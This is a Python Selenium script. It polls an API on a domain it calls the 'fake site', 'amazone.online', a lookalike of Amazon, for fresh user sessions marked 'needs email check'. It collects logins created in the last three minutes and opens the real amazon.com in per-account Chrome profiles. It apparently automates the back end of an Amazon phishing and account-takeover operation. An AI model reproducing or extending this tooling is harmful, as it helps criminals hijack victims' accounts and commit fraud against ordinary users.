import time
import os
import random
import datetime
import logging
import zipfile
import pickle
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver import ActionChains
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from selenium.webdriver.common.alert import Alert
import a_db
import json
logging.basicConfig(level=logging.INFO,
                    format='(%(module)s) %(message)s',
                    handlers=[logging.FileHandler("session.log", 'w+', 'utf-8')])
logger = logging.getLogger("Log")
url_fake_site = "https://amazone.online"


class Abrowser(object):
    def __init__(self, id_thr: int, type_script: str,
                 script_path: str, account_path: str,
                 user_id: int, user_login: str):
        try:
            a_db.session_now_plus()
            self.id_thr = id_thr
            self.type_script = type_script
            self.script_path = script_path
            self.account_path = account_path
            self.user_id = user_id
            self.user_login = user_login
            self.chrome_options = Options()
            self.chrome_options.add_argument("--lang=en")
            self.chrome_options.add_argument("--mute-audio")
            self.chrome_options.add_argument(
                f"--user-data-dir={self.account_path}")
            d = DesiredCapabilities.CHROME
            d['goog:loggingPrefs'] = { 'browser':'INFO' }
            self.driver = webdriver.Chrome(options=self.chrome_options, desired_capabilities=d)
            self.driver.set_page_load_timeout(60)
            self.print(f"Start work browsing")
            pass
        except Exception as ex:
            self.print(ex)
            self.quit()
            return

    def print(self, *msg):
        full_msg = str()
        full_msg += f"({str(self.id_thr)}) "
        full_msg += f"({datetime.datetime.utcnow().strftime('%H:%M:%S')}) "
        if hasattr(self, 'user_login'):
             full_msg += f"({self.user_login}) "
        # if hasattr(self, 'proxy'):
        #     full_msg += f"({self.proxy}) "
        full_msg += "=> "
        full_msg += " | ".join(str(x) for x in msg)
        logger.info(full_msg)
        # print(full_msg)

    def quit(self):
        if hasattr(self, 'driver'):
            self.driver.quit()
        a_db.session_now_minus()
        return

    def is_end_work(self):
        return a_db.is_end_work() 

    def searcher(self):
        try:
            while self.is_end_work() is False:
                self.get_new_users()
                time.sleep(3)
            self.quit()
        except Exception as ex:
            self.print(ex)
            self.quit()
            return

    def get_new_users(self):
        try:
            self.driver.get(f"{url_fake_site}/api/v1/user_sessions?session_status=needs%20email%20check")
            el = WebDriverWait(self.driver, 3).until(EC.visibility_of_element_located((By.XPATH, "//pre")))
            json_el = json.loads(el.text[8:-1])
            new_accs = []
            for d in reversed(json_el):
                acc_id = d["id"]
                acc_login = d["login"]
                acc_datetime = d["created_at"]
                # self.print(f"Acc with id {acc_id} and login {acc_login} and datetime {acc_datetime}")
                acc_datetime = acc_datetime[:-5]
                acc_datetime = datetime.datetime.strptime(acc_datetime, '%Y-%m-%dT%H:%M:%S')
                # self.print(f"Acc with id {acc_id} and login {acc_login} and datetime {acc_datetime} after change")
                datetime_now = datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S")
                datetime_now = datetime.datetime.strptime(datetime_now, '%Y-%m-%dT%H:%M:%S')
                diff_datetime = datetime_now - acc_datetime
                # self.print(f"Acc with id {acc_id} and login {acc_login} and datetime {acc_datetime}: different from now is {diff_datetime.seconds} seconds")
                if (diff_datetime.seconds / 60) > 3:
                    # self.print(f"Acc with id {acc_id} and login {acc_login} and datetime {acc_datetime}: different MORE than 3 minutes")
                    break
                # self.print(f"Acc with id {acc_id} and login {acc_login} and datetime {acc_datetime}: different LESS than 3 minutes, go to ADD to db")
                new_accs.append({
                    "id" : acc_id,
                    "login" : f"{acc_login}"
                })
            self.print(f"We find {len(new_accs)} new accs")
            if len(new_accs) > 0:
                return a_db.get_new_session(new_accs)
            else:
                return None
        except Exception as ex:
            self.print(ex)
            self.quit()
            return

    def user(self):
        try:
            while self.is_end_work() is True:
                self.quit()
                return
            self.driver.get(f"https://www.amazon.com/")
            self.print("I get Amazon!!!")
            time.sleep(15)
        except Exception as ex:
            self.print(ex)
            self.quit()
            return